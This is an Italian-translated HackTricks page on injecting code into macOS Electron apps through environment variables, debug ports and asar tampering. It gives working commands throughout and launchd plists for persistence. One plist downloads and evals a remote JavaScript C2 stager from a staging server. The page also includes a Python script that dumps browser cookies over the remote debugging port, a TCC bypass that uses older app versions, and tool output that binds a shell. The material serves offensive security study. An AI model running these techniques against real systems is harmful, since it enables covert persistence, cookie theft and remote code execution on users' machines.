# macOS Electron Applications Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Se non sai cos'è Electron, puoi trovare [**molte informazioni qui**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Ma per ora sappi solo che Electron esegue **node**.\
E node ha alcuni **parametri** e **variabili d'ambiente** che possono essere utilizzati per **eseguire altro codice** oltre al file indicato.

### Electron Fuses

Queste tecniche saranno discusse in seguito, ma recentemente Electron ha aggiunto diversi **flag di sicurezza per prevenirle**. Questi sono i [**Fuses di Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) e questi sono quelli usati per **prevenire** che le app Electron su macOS **carichino codice arbitrario**:

* **`RunAsNode`**: Se disabilitato, impedisce l'uso della variabile d'ambiente **`ELECTRON_RUN_AS_NODE`** per iniettare codice.
* **`EnableNodeCliInspectArguments`**: Se disabilitato, parametri come `--inspect`, `--inspect-brk` non saranno rispettati. Evitando in questo modo l'iniezione di codice.
* **`EnableEmbeddedAsarIntegrityValidation`**: Se abilitato, il **file** **`asar`** caricato sarà **validato** da macOS. **Prevenendo** in questo modo **l'iniezione di codice** modificando i contenuti di questo file.
* **`OnlyLoadAppFromAsar`**: Se questo è abilitato, invece di cercare di caricare nell'ordine seguente: **`app.asar`**, **`app`** e infine **`default_app.asar`**. Controllerà e utilizzerà solo app.asar, garantendo così che quando è **combinato** con il fuse **`embeddedAsarIntegrityValidation`** sia **impossibile** **caricare codice non validato**.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Se abilitato, il processo del browser utilizza il file chiamato `browser_v8_context_snapshot.bin` per il suo snapshot V8.

Un altro fuse interessante che non impedirà l'iniezione di codice è:

* **EnableCookieEncryption**: Se abilitato, il cookie store su disco è crittografato utilizzando chiavi crittografiche a livello di OS.

### Checking Electron Fuses

Puoi **controllare questi flag** da un'applicazione con:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modifica delle Fuses di Electron

Come menzionato nella [**documentazione**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), la configurazione delle **Fuses di Electron** è configurata all'interno del **binario di Electron** che contiene da qualche parte la stringa **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

Nelle applicazioni macOS, questo si trova tipicamente in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Puoi caricare questo file in [https://hexed.it/](https://hexed.it/) e cercare la stringa precedente. Dopo questa stringa puoi vedere in ASCII un numero "0" o "1" che indica se ogni fusibile è disabilitato o abilitato. Modifica semplicemente il codice esadecimale (`0x30` è `0` e `0x31` è `1`) per **modificare i valori dei fusibili**.

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Nota che se provi a **sovrascrivere** il **`binario del Framework Electron`** all'interno di un'applicazione con questi byte modificati, l'app non verrà eseguita.

## RCE aggiungendo codice alle applicazioni Electron

Potrebbero esserci **file JS/HTML esterni** che un'app Electron sta utilizzando, quindi un attaccante potrebbe iniettare codice in questi file la cui firma non verrà controllata ed eseguire codice arbitrario nel contesto dell'app.

{% hint style="danger" %}
Tuttavia, al momento ci sono 2 limitazioni:

* Il permesso **`kTCCServiceSystemPolicyAppBundles`** è **necessario** per modificare un'app, quindi per impostazione predefinita questo non è più possibile.
* Il file compilato **`asap`** di solito ha i fusibili **`embeddedAsarIntegrityValidation`** `e` **`onlyLoadAppFromAsar`** `abilitati`

Rendendo questo percorso di attacco più complicato (o impossibile).
{% endhint %}

Nota che è possibile eludere il requisito di **`kTCCServiceSystemPolicyAppBundles`** copiando l'applicazione in un'altra directory (come **`/tmp`**), rinominando la cartella **`app.app/Contents`** in **`app.app/NotCon`**, **modificando** il file **asar** con il tuo codice **maligno**, rinominandolo di nuovo in **`app.app/Contents`** ed eseguendolo.

Puoi estrarre il codice dal file asar con:
```bash
npx asar extract app.asar app-decomp
```
E imballalo di nuovo dopo averlo modificato con:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE con `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Secondo [**la documentazione**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), se questa variabile di ambiente è impostata, avvierà il processo come un normale processo Node.js.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Se il fuse **`RunAsNode`** è disabilitato, la variabile d'ambiente **`ELECTRON_RUN_AS_NODE`** verrà ignorata e questo non funzionerà.
{% endhint %}

### Iniezione dal Plist dell'App

Come [**proposto qui**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), potresti abusare di questa variabile d'ambiente in un plist per mantenere la persistenza:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE con `NODE_OPTIONS`

Puoi memorizzare il payload in un file diverso ed eseguirlo:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Se il fuse **`EnableNodeOptionsEnvironmentVariable`** è **disabilitato**, l'app **ignorerà** la variabile d'ambiente **NODE\_OPTIONS** quando viene avviata, a meno che la variabile d'ambiente **`ELECTRON_RUN_AS_NODE`** non sia impostata, che sarà anch'essa **ignorata** se il fuse **`RunAsNode`** è disabilitato.

Se non imposti **`ELECTRON_RUN_AS_NODE`**, troverai l'**errore**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### Iniezione dal Plist dell'App

Potresti abusare di questa variabile d'ambiente in un plist per mantenere la persistenza aggiungendo queste chiavi:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE con ispezione

Secondo [**questo**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), se esegui un'applicazione Electron con flag come **`--inspect`**, **`--inspect-brk`** e **`--remote-debugging-port`**, una **porta di debug sarà aperta** così potrai connetterti ad essa (ad esempio da Chrome in `chrome://inspect`) e sarai in grado di **iniettare codice su di essa** o persino avviare nuovi processi.\
Per esempio:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Se il fuse **`EnableNodeCliInspectArguments`** è disabilitato, l'app **ignorerà i parametri node** (come `--inspect`) quando viene avviata, a meno che la variabile di ambiente **`ELECTRON_RUN_AS_NODE`** non sia impostata, che sarà anch'essa **ignorata** se il fuse **`RunAsNode`** è disabilitato.

Tuttavia, puoi comunque utilizzare il **parametro electron `--remote-debugging-port=9229`** ma il payload precedente non funzionerà per eseguire altri processi.
{% endhint %}

Utilizzando il parametro **`--remote-debugging-port=9222`** è possibile rubare alcune informazioni dall'App Electron come la **cronologia** (con comandi GET) o i **cookie** del browser (poiché sono **decrittografati** all'interno del browser e c'è un **endpoint json** che li fornirà).

Puoi imparare come farlo [**qui**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) e [**qui**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) e utilizzare lo strumento automatico [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) o uno script semplice come:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
In [**questo post del blog**](https://hackerone.com/reports/1274695), questo debug viene abusato per far sì che un chrome headless **scarichi file arbitrari in posizioni arbitrarie**.

### Iniezione dal Plist dell'App

Potresti abusare di questa variabile d'ambiente in un plist per mantenere la persistenza aggiungendo queste chiavi:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Bypass TCC abusando di versioni precedenti

{% hint style="success" %}
Il demone TCC di macOS non controlla la versione eseguita dell'applicazione. Quindi, se **non puoi iniettare codice in un'applicazione Electron** con nessuna delle tecniche precedenti, puoi scaricare una versione precedente dell'APP e iniettare codice su di essa poiché otterrà comunque i privilegi TCC (a meno che il Trust Cache non lo impedisca).
{% endhint %}

## Esegui codice non JS

Le tecniche precedenti ti permetteranno di eseguire **codice JS all'interno del processo dell'applicazione electron**. Tuttavia, ricorda che i **processi figli vengono eseguiti sotto lo stesso profilo sandbox** dell'applicazione padre e **erediteranno i loro permessi TCC**.\
Pertanto, se desideri abusare dei diritti per accedere alla fotocamera o al microfono, ad esempio, puoi semplicemente **eseguire un altro binario dal processo**.

## Iniezione automatica

Lo strumento [**electroniz3r**](https://github.com/r3ggi/electroniz3r) può essere facilmente utilizzato per **trovare applicazioni electron vulnerabili** installate e iniettare codice su di esse. Questo strumento cercherà di utilizzare la tecnica **`--inspect`**:

Devi compilarlo tu stesso e puoi usarlo in questo modo:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Riferimenti

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{% hint style="success" %}
Impara e pratica il hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>
{% endhint %}
